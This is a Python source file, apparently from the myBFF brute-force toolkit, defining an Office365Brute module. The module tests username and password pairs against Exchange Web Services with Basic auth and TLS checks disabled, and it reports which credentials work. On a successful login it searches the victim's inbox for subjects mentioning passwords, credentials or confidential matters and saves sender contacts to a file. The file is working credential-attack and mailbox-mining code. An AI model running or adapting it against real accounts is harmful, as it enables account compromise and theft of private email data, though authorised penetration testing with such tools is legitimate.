#! /bin/python
# Created by Adam Compton (tatanus)
# Part of myBFF
from core.webModule import webModule
import base64
from lxml import etree
import re
import random
import time
import requests
from requests import session
import sys



class Office365Brute(webModule):
    def __init__(self, config, display, lock):
        super(Office365Brute, self).__init__(config, display, lock)
        self.fingerprint="[o, O]utlook"
        self.response="Success"
        self.protocol="web"
    term = ['credential', 'account', 'password', 'login', 'confidential']
    def somethingCool(self, term, data, config):
        # Parse the result xml
        root = etree.fromstring(data)
        xpathStr = "/s:Envelope/s:Body/m:FindItemResponse/m:ResponseMessages/m:FindItemResponseMessage/m:RootFolder/t" \
                ":Items/t:Message"
        namespaces = {
                    's': 'http://schemas.xmlsoap.org/soap/envelope/',
                    't': 'http://schemas.microsoft.com/exchange/services/2006/types',
                    'm': 'http://schemas.microsoft.com/exchange/services/2006/messages',
                }

        contacts = []
        # Print Mail properties
        print("[+]  Searching for sensitive emails...")
        elements = root.xpath(xpathStr, namespaces=namespaces)
        for element in elements:
            try:
                subject = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}Subject').text
                fromname = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}From/{http://schemas.microsoft.com/exchange/services/2006/types}Mailbox/{http://schemas.microsoft.com/exchange/services/2006/types}Name').text
                fromemail = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}From/{http://schemas.microsoft.com/exchange/services/2006/types}Mailbox/{http://schemas.microsoft.com/exchange/services/2006/types}EmailAddress').text
                itemid = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}ItemId').attrib['Id']
                changekey = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}ItemId').attrib['ChangeKey']
                contacts.append(fromname.encode('ascii', 'ignore') + " (" + fromemail.encode('ascii', 'ignore') + ")")
                for search_term in term:
                    if re.search(search_term, subject, re.IGNORECASE):
                        print "[+] This could be interesting: "
                        print "[+]       * Subject : " + subject.encode('ascii', 'ignore')
                        print "[+]       * From : " + fromname.encode('ascii', 'ignore') + " (" + fromemail.encode('ascii', 'ignore') + ")"
            except:
                pass
        print("[+]  Any contacts found will be saved to tmp/contacts-" + config["USERNAME"] + "...")
        try:
            for contact in sorted(set(contacts)):
                #print("[+]  Contact Name:  " + contact)
                f = open('./tmp/contacts-' + config["USERNAME"] + '.txt', 'a')
                f.write(contact + '\n')
                f.close()
        except:
            print("[-]  No contacts found in mailbox.")

    def connectTest(self, config, payload, proxy, submitLoc, submitType):
        if config["domain"]:
            user = config["domain"] + '\\' + config["USERNAME"]
        else:
            user = config["USERNAME"]
        if 'https' in config["HOST"]:
            host = config["HOST"].strip('https://')
        else:
            host = config["HOST"].strip('http://')
        if '/' in host:
            host = re.sub(r'/s\w+', '', host)
        payload = """<?xml version="1.0" encoding="utf-8"?>
            <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
            <soap:Body>
            <FindItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"
                xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                Traversal="Shallow">
            <ItemShape>
            <t:BaseShape>Default</t:BaseShape>
            </ItemShape>
            <ParentFolderIds>
            <t:DistinguishedFolderId Id="inbox"/>
            </ParentFolderIds>
            </FindItem>
            </soap:Body>
            </soap:Envelope>""".format()
        auth = base64.encodestring("%s:%s" % (user, config["PASSWORD"])).replace('\n', '')
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            c.headers.update({"Host": host,
                "Content-Type": "text/xml; charset=UTF-8",
                "Content-Length": str(len(payload)),
                "Authorization": "Basic %s" % auth})
            resp1 = c.post(config["HOST"] + "/ews/Exchange.asmx", data=payload, allow_redirects=True, verify=False, proxies=proxy)
            if "200" in str(resp1):
                print("[+]  User Credentials Successful: " + user + ":" + config["PASSWORD"])
                if not config["dry_run"]:
                    print("[!] Time to do something cool!")
                    resp2 = resp1.content
                    data = resp2
                    self.somethingCool(self.term, data, config)
            else:
                print("[-]  Login Failed for: " + user + ":" + config["PASSWORD"])
